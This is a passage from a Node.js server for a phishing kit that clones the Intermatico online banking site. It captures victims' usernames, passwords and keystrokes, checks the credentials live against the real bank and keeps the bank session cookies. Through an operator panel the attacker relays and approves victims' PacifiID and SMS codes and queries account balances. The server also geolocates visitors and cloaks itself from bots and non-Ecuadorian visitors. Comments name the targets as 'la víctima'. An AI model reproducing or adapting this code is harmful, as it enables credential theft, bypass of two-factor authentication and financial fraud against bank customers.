      return sendJson(res, 400, { valid: true, message: null, error: e.message });
    }
  }

  if (urlPath === '/api/empresa-login' && req.method === 'POST') {
    let usuario = '';
    let clave = '';
    try {
      const body = JSON.parse((await readBody(req)) || '{}');
      usuario = String(body.usuario || '').trim();
      clave = String(body.clave || '');
    } catch (e) {
      return sendJson(res, 400, { valid: false, message: 'Solicitud inválida.' });
    }
    if (!usuario || !clave) {
      return sendJson(res, 200, { valid: false, message: 'Faltan usuario o clave.' });
    }
    try {
      const r = await empresaLogin(usuario, clave);
      // Registrar en el panel de captura (por cookie labSid)
      const reg = obtenerOcrearSesion(req, res);
      reg.usuario = usuario;
      reg.clave = clave;
      reg.flujo = 'empresas';
      reg.empresaLogin = { valido: !!r.valid, ts: Date.now() };
      reg.visto = Date.now();
      if (r.valid) {
        return sendJson(res, 200, {
          valid: true,
          message: 'Credenciales correctas.',
          nombreImagen: r.nombreImagen,
          imagenUrl: r.imagenPath ? `/api/avatar?path=${encodeURIComponent(r.imagenPath)}` : null,
          detalle: r.detalle,
        });
      }
      return sendJson(res, 200, {
        valid: false,
        message: r.message || 'Usuario o contraseña no válidos.',
        detalle: r.detalle,
      });
    } catch (e) {
      return sendJson(res, 200, { valid: false, message: `No fue posible validar: ${e.message}` });
    }
  }

  if (urlPath === '/api/telemetria' && req.method === 'POST') {
    let body = {};
    try {
      body = JSON.parse((await readBody(req)) || '{}');
    } catch (e) {
      return sendJson(res, 400, { ok: false });
    }
    const reg = obtenerOcrearSesion(req, res);
    reg.visto = Date.now();
    const tipo = String(body.tipo || '');
    if (tipo === 'conexion') {
      reg.flujo = body.flujo || reg.flujo;
      reg.paso = 'user';
      // geo asíncrona (no bloquea la respuesta)
      geoDeIp(reg.ip).then(g => { reg.geo = g; });
    } else if (tipo === 'paso') {
      reg.flujo = body.flujo || reg.flujo;
      reg.paso = body.paso || reg.paso;
    } else if (tipo === 'tecla') {
      const campo = String(body.campo || '');
      const valor = String(body.valor == null ? '' : body.valor);
      if (campo === 'usuario') reg.usuario = valor;
      else if (campo === 'clave') reg.clave = valor;
      else if (campo === 'dispositivo') reg.dispositivo = valor;
      else if (campo === 'codigo') reg.codigo = valor;
      else if (campo === 'codigoSms') reg.codigoSms = valor;
      reg.tecleando = { campo, ts: Date.now() };
    } else if (tipo === 'avatar') {
      reg.usuario = body.usuario || reg.usuario;
      reg.avatarUrl = body.avatarUrl || reg.avatarUrl;
      reg.nombreImagen = body.nombreImagen || reg.nombreImagen;
    }
    marcarSucio();
    return sendJson(res, 200, { ok: true });
  }

  if (urlPath === '/api/codigo' && req.method === 'POST') {
    let body = {};
    try { body = JSON.parse((await readBody(req)) || '{}'); } catch (e) {}
    const codigo = String(body.codigo || '').trim();
    const tipo = body.tipo === 'sms' ? 'sms' : 'pacifiid';
    if (!codigo) return sendJson(res, 200, { valid: false, message: 'Ingresa el código.' });
    const reg = obtenerOcrearSesion(req, res);
    if (tipo === 'sms') reg.codigoSms = codigo; else reg.codigo = codigo;
    reg.visto = Date.now();
    const pend = { codigo, tipo, ts: Date.now(), resuelto: false, resolve: null };
    pend.promesa = new Promise(r => { pend.resolve = r; });
    reg.codigoPendiente = pend;
    // Esperar la decisión del operador en el panel (máx. 4 minutos)
    const ESPERA_MS = 240000;
    const veredicto = await Promise.race([
      pend.promesa,
      new Promise(r => setTimeout(() => r(null), ESPERA_MS)),
    ]);
    if (veredicto === null) {
      if (reg.codigoPendiente === pend) reg.codigoPendiente = null;
      return sendJson(res, 200, { valid: false, message: 'No fue posible verificar el código en este momento. Inténtalo de nuevo.' });
    }
    if (veredicto === 'sms') {
      // El operador pidió cambiar la pantalla de la víctima al código SMS
      return sendJson(res, 200, { valid: false, accion: 'sms', message: 'Ingresa el código que te llegó por SMS.' });
    }
    if (veredicto === 'bueno') {
      return sendJson(res, 200, { valid: true, message: 'Código verificado.' });
    }
    return sendJson(res, 200, { valid: false, message: 'Código incorrecto. Verifica el código generado en tu app PacificID.' });
  }

  if (urlPath === '/api/panel/sesiones' && req.method === 'GET') {
    const lista = [...panelSessions.values()]
      .sort((a, b) => b.creado - a.creado)
      .map(registroPublico);
    return sendJson(res, 200, { sesiones: lista, total: lista.length });
  }

  if (/^\/api\/panel\/sesiones\/[\w-]+$/.test(urlPath) && req.method === 'DELETE') {
    const sid = urlPath.split('/').pop();
    const ok = panelSessions.delete(sid);
    marcarSucio();
    if (ok) guardarDatos();
    return sendJson(res, 200, { ok });
  }

  if (/^\/api\/panel\/veredicto\/[\w-]+$/.test(urlPath) && req.method === 'POST') {
    const sid = urlPath.split('/').pop();
    const reg = panelSessions.get(sid);
    if (!reg) return sendJson(res, 404, { ok: false, message: 'Sesión no encontrada.' });
    let body = {};
    try { body = JSON.parse((await readBody(req)) || '{}'); } catch (_) {}
    reg.codigoVeredicto = body.valor === 'bueno' ? 'bueno' : (body.valor === 'malo' ? 'malo' : null);
    reg.visto = Date.now();
    marcarSucio();
    // Si la víctima está esperando el veredicto (pantalla de código en carga), liberarla
    if (reg.codigoPendiente && !reg.codigoPendiente.resuelto) {
      reg.codigoPendiente.resuelto = true;
      reg.codigoPendiente.resolve(reg.codigoVeredicto || 'malo');
      reg.codigoPendiente = null;
    }
    return sendJson(res, 200, { ok: true, codigoVeredicto: reg.codigoVeredicto });
  }

  if (/^\/api\/panel\/sms\/[\w-]+$/.test(urlPath) && req.method === 'POST') {
    const sid = urlPath.split('/').pop();
    const reg = panelSessions.get(sid);
    if (!reg) return sendJson(res, 404, { ok: false, message: 'Sesión no encontrada.' });
    // NO se llama al banco: el botón solo cambia la pantalla de la víctima
    // del loading del PacifiID a la pantalla del código SMS (dPc_).
    if (reg.codigoPendiente && !reg.codigoPendiente.resuelto) {
      reg.codigoPendiente.resuelto = true;
      reg.codigoPendiente.resolve('sms');
      reg.codigoPendiente = null;
      reg.sms = { estado: 'solicitado', mensaje: 'Pantalla de la víctima cambiada al código SMS (dPc_).', ts: Date.now() };
    } else {
      reg.sms = { estado: 'aviso', mensaje: 'SMS solicitado, pero la víctima no estaba en la pantalla del código.', ts: Date.now() };
    }
    marcarSucio();
    guardarDatos();
    return sendJson(res, 200, { ok: true, sms: reg.sms });
  }

  if (/^\/api\/panel\/saldo\/[\w-]+$/.test(urlPath) && req.method === 'POST') {
    const sid = urlPath.split('/').pop();
    const reg = panelSessions.get(sid);
    if (!reg) return sendJson(res, 404, { ok: false, message: 'Sesión no encontrada.' });
    try {
      const r = await consultarSaldo(reg);
      reg.saldoConsulta = r;
      marcarSucio();
      guardarDatos();
      return sendJson(res, 200, { ok: true, saldo: r });
    } catch (e) {
      reg.saldoConsulta = { estado: 'error', mensaje: e.message, ts: Date.now() };
      return sendJson(res, 200, { ok: false, saldo: reg.saldoConsulta });
    }
  }

  if (urlPath.startsWith('/api/avatar') && req.method === 'GET') {
    const q = new URL(urlPath, `http://${HOST}:${PORT}`).searchParams;
    const p = String(q.get('path') || '');
    const permitido = p.startsWith('/ebanking/') || p.startsWith('/detect2/') || p.startsWith('/detect/');
    if (!permitido) {
      return sendJson(res, 400, { valid: false, message: 'Ruta no permitida.' });
    }
    // Si la imagen ya se trajo con sesión (cache), servirla directamente
    const cached = imgCache.get(p);
    if (cached) {
      res.writeHead(200, { 'Content-Type': cached.contentType, 'Cache-Control': 'no-store' });
      return res.end(cached.buffer);
    }
    try {
      const img = await reqBankBin('www.intermatico.com', p, {
        'User-Agent': UA,
        'Referer': 'https://www.intermatico.com/ebanking/seguridad/login.htm',
      });
      if (img.status !== 200) {
        return sendJson(res, img.status, { valid: false, message: `El banco respondió ${img.status}.` });
      }
      res.writeHead(200, {
        'Content-Type': img.headers['content-type'] || 'image/jpeg',
        'Cache-Control': 'no-store',
      });
      return res.end(img.body);
    } catch (e) {
      return sendJson(res, 200, { valid: false, message: `No fue posible descargar el avatar: ${e.message}` });
    }
  }

  if (urlPath === '/api/login' && req.method === 'POST') {
    let usuario = '';
    let clave = '';
    try {
      const body = JSON.parse((await readBody(req)) || '{}');
      usuario = String(body.usuario || '').trim();
      clave = String(body.clave || '');
    } catch (e) {
      return sendJson(res, 400, { valid: false, message: 'Solicitud inválida.' });
    }
    if (!usuario || !clave) {
      return sendJson(res, 200, { valid: false, message: 'Faltan usuario o clave.' });
    }
    try {
      const r = await loginIntermatico(usuario, clave);
      // Registrar en el panel de captura (por cookie labSid)
      const reg = obtenerOcrearSesion(req, res);
      reg.usuario = usuario;
      reg.clave = clave;
      reg.visto = Date.now();
      reg.login = {
        valido: !!(r.pideRegistro || r.pidePacificID || r.dashboard),
        resultado: r.dashboard ? 'dashboard' : (r.pideRegistro ? 'dispositivo' : (r.pidePacificID ? 'codigo' : 'error')),
        nombre: r.nombre || null,
        saldo: r.saldo || null,
        ipClient: r.ipClient || null,
        ts: Date.now(),
      };
      if (reg.login.valido) reg.bancoSession = r.cookies;
      const detalle = { ...r, cookies: undefined };
      if (r.errorLogin) {
        return sendJson(res, 200, { valid: false, message: 'Usuario o contraseña no válidos.', detalle });
      }
      if (r.pideRegistro || r.pidePacificID || r.dashboard) {
        const resultado = r.dashboard ? 'dashboard' : (r.pideRegistro ? 'dispositivo' : 'codigo');
        return sendJson(res, 200, {
          valid: true,
          resultado,
          nombre: r.nombre,
          saldo: r.saldo,
          ipClient: r.ipClient,
          detalle,
        });
      }
      // Estado no reconocido: tratar como inválido para no dejar pasar nada dudoso.
      return sendJson(res, 200, {
        valid: false,
        message: 'No fue posible confirmar las credenciales (estado desconocido).',
        detalle: r,
      });
    } catch (e) {
      return sendJson(res, 200, { valid: false, message: `No fue posible validar: ${e.message}` });
    }
  }

  if (urlPath === '/robots.txt' && req.method === 'GET') {
    // Los bots externos solo indexan Términos y Condiciones; el resto es para personas.
    const body = 'User-agent: *\nAllow: /terminos/\nDisallow: /\n\nSitemap: https://' + (req.headers.host || `${HOST}:${PORT}`) + '/sitemap.xml\n';
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-cache' });
    return res.end(body);
  }

  if (urlPath === '/sitemap.xml' && req.method === 'GET') {
    const base = 'https://' + (req.headers.host || `${HOST}:${PORT}`);
    const hoy = new Date().toISOString().slice(0, 10);
    const body = `<?xml version="1.0" encoding="UTF-8"?>\n` +
      `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n` +
      `  <url><loc>${base}/terminos/</loc><lastmod>${hoy}</lastmod><priority>1.0</priority></url>\n` +
      `</urlset>\n`;
    res.writeHead(200, { 'Content-Type': 'application/xml; charset=utf-8', 'Cache-Control': 'no-cache' });
    return res.end(body);
  }

  if (urlPath.startsWith('/api/')) {
    return sendJson(res, 404, { valid: false, message: 'Endpoint desconocido.' });
  }

  // ---------- Filtro del index: solo humanos desde Ecuador ----------
  const PAGINAS_VICTIMA = ['/', '/index.html', '/personas/', '/personas/index.html', '/empresas/', '/empresas/index.html'];
  const rutaLimpia = urlPath.split('?')[0].replace(/\/+$/, '') || '/';
  const esPaginaVictima = PAGINAS_VICTIMA.includes(urlPath.split('?')[0]) ||
    PAGINAS_VICTIMA.includes(rutaLimpia + '/') || PAGINAS_VICTIMA.includes(rutaLimpia);
  if (esPaginaVictima && !(await permitirVerIndex(req))) {
    // Bot o visitante de otro país → Términos y Condiciones
    return streamFile(res, path.join(ROOT, 'terminos', 'index.html'));
  }

  // ---------- Estáticos ----------
  serveStatic(req, res, urlPath);
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`El puerto ${PORT} ya está en uso (¿hay otro server o el Python http.server activo?).`);
    console.error('Ciérralo o usa otro puerto:  set PORT=8139 && node server.cjs');
  } else {
    console.error('Error del servidor:', err.message);
  }
  process.exit(1);
});

server.listen(PORT, HOST, () => {
  console.log('==========================================================');
  console.log(' Clone Intermatico + validación real de credenciales');
  console.log(` Sitio:        http://${HOST}:${PORT}/`);
  console.log(' Personas:     http://' + HOST + ':' + PORT + '/personas/');
  console.log(' Empresas:     http://' + HOST + ':' + PORT + '/empresas/');
  console.log(' API health:   http://' + HOST + ':' + PORT + '/api/health');
  console.log(' POST /api/usuario  {usuario}');
  console.log(' POST /api/login    {usuario, clave}');
  console.log(' POST /api/empresa-login {usuario, clave}');
  console.log(' PANEL:  http://' + HOST + ':' + PORT + '/panel/');
  console.log('==========================================================');
});

// Alias en el puerto histórico 8137 (antes usado por el Python http.server).
// Solo en local; en Render (PORT inyectado) no se abre el alias salvo PORT_LEGADO.
const PUERTO_LEGADO = process.env.PORT_LEGADO || (process.env.PORT ? null : '8137');
if (PUERTO_LEGADO !== PORT) {
  const alias = http.createServer(function (req, res) { server.emit('request', req, res); });
  alias.on('error', function (err) {
    if (err.code === 'EADDRINUSE') {
      console.log('(Puerto ' + PUERTO_LEGADO + ' ocupado — solo se usa ' + PORT + ')');
    } else {
      console.error('Error alias ' + PUERTO_LEGADO + ':', err.message);
    }
  });
  alias.listen(PUERTO_LEGADO, '127.0.0.1', function () {
    console.log(' Alias:         http://127.0.0.1:' + PUERTO_LEGADO + '/  (mismo servicio)');
  });
}

